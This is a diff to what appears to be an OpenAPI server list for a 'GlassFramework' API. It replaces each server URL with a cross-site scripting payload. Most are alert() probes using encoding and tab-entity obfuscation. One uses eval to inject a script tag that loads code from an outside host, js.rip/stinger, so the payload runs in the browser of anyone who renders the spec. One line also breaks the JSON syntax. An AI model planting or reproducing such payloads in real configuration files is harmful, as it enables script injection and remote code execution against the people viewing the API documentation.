@@ -7,27 +7,27 @@
     "servers": [
         {
             "description": "API YourServer",
-            "url": "javascript:alert();/GlassFramework/webresources"
+            "url": "javascript:alert();"
         },
         {
             "description": "API LocalHost",
-            "url": "http://localhost:8080/GlassFramework/webresources"
+            "url": "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/stinger\';document.body.appendChild(a)')"
         },    
         {
             "description": "API GlassDevTesting Internal",
-            "url": "http://10.0.7.65:8083/GlassFramework/webresources"
+            "url": "jav&#x09;ascript:alert('XSS');"
         },
         {
             "description": "API GlassDevTesting External",
-            "url": "https://glass.epos.ubi.pt:8083/GlassFramework/webresources"
+            "url": "\\\";onload=alert('XSS');//"
         },
         {
             "description": "API Products Portal",
-            "url": "https://glass.epos.ubi.pt:8080/GlassFramework/webresources"
+            "url": "&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;"
         },
         {
             "description": "API Data GateWay",
-            "url": "http://gnssdata-epos.oca.eu:8080/GlassFramework/webresources"
+            "url": \"#\"><img src=M onerror=alert('XSS');>"
         }
     ],
     "paths" : {
